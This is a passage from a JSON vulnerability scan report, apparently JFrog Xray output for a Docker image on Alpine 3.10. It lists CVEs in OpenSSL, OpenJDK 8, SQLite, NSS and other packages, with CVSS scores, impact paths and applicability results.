                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "cve_id": "CVE-2022-22825",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the following vulnerable functions are called:</p>\n<ul>\n<li><code>XML_Parse</code></li>\n<li><code>XML_ParseBuffer</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "vulnerability_id": "CVE-2022-22825",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-445047",
                    "summary": "Applications that use a non-default option when verifying certificates may be\nvulnerable to an attack from a malicious CA to circumvent certain checks.\n\nInvalid certificate policies in leaf certificates are silently ignored by\nOpenSSL and other certificate policy checks are skipped for that certificate.\nA malicious CA could use this to deliberately assert invalid certificate policies\nin order to circumvent policy checking on the certificate altogether.\n\nPolicy processing is disabled by default but can be enabled by passing\nthe `-policy' argument to the command line utilities or by calling the\n`X509_VERIFY_PARAM_set1_policies()' function.",
                    "description": "Applications that use a non-default option when verifying certificates may be\nvulnerable to an attack from a malicious CA to circumvent certain checks.\n\nInvalid certificate policies in leaf certificates are silently ignored by\nOpenSSL and other certificate policy checks are skipped for that certificate.\nA malicious CA could use this to deliberately assert invalid certificate policies\nin order to circumvent policy checking on the certificate altogether.\n\nPolicy processing is disabled by default but can be enabled by passing\nthe `-policy' argument to the command line utilities or by calling the\n`X509_VERIFY_PARAM_set1_policies()' function.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-0465",
                            "cwe": [
                                "CWE-295"
                            ],
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                        }
                    ],
                    "created": "2023-03-29T00:00:00.977Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2023-0465",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether OpenSSL supports the vulnerable policy constraints parsing functionality, by checking whether the <code>X509_VERIFY_PARAM_set1_policies</code> function is called (the functionality is disabled by default)</p>\n<p>Note that the scanner does not check for an additional vulnerable case in which the vulnerable policy constraints parsing functionality is enabled via the command line flag <code>-policy</code>. For example, by running <code>openssl ca -policy match</code>. However - in this case, the vulnerability will lead to a DoS of a forked command-line utility, which has a minimal impact on security.</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2023-0465",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether OpenSSL supports the vulnerable policy constraints parsing functionality, by checking whether the <code>X509_VERIFY_PARAM_set1_policies</code> function is called (the functionality is disabled by default)</p>\n<p>Note that the scanner does not check for an additional vulnerable case in which the vulnerable policy constraints parsing functionality is enabled via the command line flag <code>-policy</code>. For example, by running <code>openssl ca -policy match</code>. However - in this case, the vulnerability will lead to a DoS of a forked command-line utility, which has a minimal impact on security.</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2023-0465",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2023-0465",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-100604",
                    "summary": "An issue was discovered in cplus-dem.c in GNU libiberty, as distributed in GNU Binutils 2.31. There is a NULL pointer dereference in work_stuff_copy_to_from when called from iterate_demangle_function.",
                    "description": "An issue was discovered in cplus-dem.c in GNU libiberty, as distributed in GNU Binutils 2.31. There is a NULL pointer dereference in work_stuff_copy_to_from when called from iterate_demangle_function.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2018-17794",
                            "cwe": [
                                "CWE-476"
                            ],
                            "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "6.5/CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2020-06-14T00:00:00.218Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libgcc:8.3.0-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libstdc++:8.3.0-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2018-17794",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-187942",
                    "summary": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Java SE: 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows low privileged attacker with network access via Kerberos to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Oracle GraalVM Enterprise Edition, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 6.8 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N).",
                    "description": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Java SE: 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows low privileged attacker with network access via Kerberos to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Oracle GraalVM Enterprise Edition, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 6.8 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-35567",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "6.3/CVSS:2.0/AV:N/AC:M/Au:S/C:C/I:N/A:N",
                            "cvss_v3": "6.8/CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N"
                        }
                    ],
                    "created": "2021-10-21T00:00:00.666Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-lib:8.275.01-r0",
                            "cve_id": "CVE-2021-35567",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks that the vulnerable JAAS (Java Authentication and Authorization Service) Kerberos 5 login module is in use, by checking that all of the following conditions are true -</p>\n<ol>\n<li>Code condition - The JAAS API <code>LoginContext.login</code> is called</li>\n<li>Configuration condition - A JAAS configuration file specifies the module <code>com.sun.security.auth.module.Krb5LoginModule</code></li>\n</ol>",
                            "evidence": null,
                            "info": "This CVE is not applicable because Java Authentication and Authorization Service is not configured in a vulnerable way",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-base:8.275.01-r0",
                            "cve_id": "CVE-2021-35567",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks that the vulnerable JAAS (Java Authentication and Authorization Service) Kerberos 5 login module is in use, by checking that all of the following conditions are true -</p>\n<ol>\n<li>Code condition - The JAAS API <code>LoginContext.login</code> is called</li>\n<li>Configuration condition - A JAAS configuration file specifies the module <code>com.sun.security.auth.module.Krb5LoginModule</code></li>\n</ol>",
                            "evidence": null,
                            "info": "This CVE is not applicable because Java Authentication and Authorization Service is not configured in a vulnerable way",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre:8.275.01-r0",
                            "cve_id": "CVE-2021-35567",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks that the vulnerable JAAS (Java Authentication and Authorization Service) Kerberos 5 login module is in use, by checking that all of the following conditions are true -</p>\n<ol>\n<li>Code condition - The JAAS API <code>LoginContext.login</code> is called</li>\n<li>Configuration condition - A JAAS configuration file specifies the module <code>com.sun.security.auth.module.Krb5LoginModule</code></li>\n</ol>",
                            "evidence": null,
                            "info": "This CVE is not applicable because Java Authentication and Authorization Service is not configured in a vulnerable way",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-lib:8.275.01-r0",
                            "vulnerability_id": "CVE-2021-35567",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-base:8.275.01-r0",
                            "vulnerability_id": "CVE-2021-35567",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre:8.275.01-r0",
                            "vulnerability_id": "CVE-2021-35567",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-526073",
                    "summary": "Vulnerability in Oracle Java SE (component: JavaFX).   The supported version that is affected is Oracle Java SE: 8u371. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE.  Successful attacks of this vulnerability can result in  unauthorized creation, deletion or modification access to critical data or all Oracle Java SE accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 5.9 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N).",
                    "description": "Vulnerability in Oracle Java SE (component: JavaFX).   The supported version that is affected is Oracle Java SE: 8u371. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE.  Successful attacks of this vulnerability can result in  unauthorized creation, deletion or modification access to critical data or all Oracle Java SE accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 5.9 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-22043",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"
                        }
                    ],
                    "created": "2023-07-19T00:00:00.711Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-22043",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-612407",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u411, 8u411-perf, 11.0.23, 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM for JDK: 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM Enterprise Edition: 20.3.14 and  21.3.10. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 7.4 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u411, 8u411-perf, 11.0.23, 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM for JDK: 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM Enterprise Edition: 20.3.14 and  21.3.10. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 7.4 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N).",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-21147"
                        }
                    ],
                    "created": "2024-07-18T00:00:00.278Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-21147",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-99973",
                    "summary": "SQLite through 3.32.0 has an integer overflow in sqlite3_str_vappendf in printf.c.",
                    "description": "SQLite through 3.32.0 has an integer overflow in sqlite3_str_vappendf in printf.c.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2020-13434",
                            "cwe": [
                                "CWE-190"
                            ],
                            "cvss_v2": "2.1/CVSS:2.0/AV:L/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2020-06-05T00:00:00.583Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:sqlite-libs:3.28.0-r3"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2020-13434",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-253716",
                    "summary": "Libjpeg-turbo versions 2.0.91 and 2.0.90 is vulnerable to a denial of service vulnerability caused by a divide by zero when processing a crafted GIF image.",
                    "description": "Libjpeg-turbo versions 2.0.91 and 2.0.90 is vulnerable to a denial of service vulnerability caused by a divide by zero when processing a crafted GIF image.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-20205",
                            "cwe": [
                                "CWE-369"
                            ],
                            "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2022-09-11T00:00:00.120Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libjpeg-turbo:2.0.4-r1"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-20205",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-693688",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: 2D).  Supported versions that are affected are Oracle Java SE: 8u441, 8u441-perf, 11.0.26, 17.0.14, 21.0.6, 24; Oracle GraalVM for JDK: 17.0.14, 21.0.6, 24; Oracle GraalVM Enterprise Edition: 20.3.17 and  21.3.13. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data and unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 5.6 (Confidentiality, Integrity and Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: 2D).  Supported versions that are affected are Oracle Java SE: 8u441, 8u441-perf, 11.0.26, 17.0.14, 21.0.6, 24; Oracle GraalVM for JDK: 17.0.14, 21.0.6, 24; Oracle GraalVM Enterprise Edition: 20.3.17 and  21.3.13. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data and unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 5.6 (Confidentiality, Integrity and Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L).",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2025-30698"
                        }
                    ],
                    "created": "2025-04-19T00:00:00.123Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2025-30698",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-176861",
                    "summary": "A flaw was found in the way CHACHA20-POLY1305 was implemented in NSS in versions before 3.55. When using multi-part Chacha20, it could cause out-of-bounds reads. This issue was fixed by explicitly disabling multi-part ChaCha20 (which was not functioning correctly) and strictly enforcing tag length. The highest threat from this vulnerability is to confidentiality and system availability.",
                    "description": "A flaw was found in the way CHACHA20-POLY1305 was implemented in NSS in versions before 3.55. When using multi-part Chacha20, it could cause out-of-bounds reads. This issue was fixed by explicitly disabling multi-part ChaCha20 (which was not functioning correctly) and strictly enforcing tag length. The highest threat from this vulnerability is to confidentiality and system availability.",
                    "issue_type": "security",
                    "severity": "Critical",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2020-12403",
                            "cwe": [
                                "CWE-125"
                            ],
                            "cvss_v2": "6.4/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:P",
                            "cvss_v3": "9.1/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H"
                        }
                    ],
                    "created": "2021-05-30T00:00:00.170Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:nss:3.44.3-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2020-12403",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-187944",
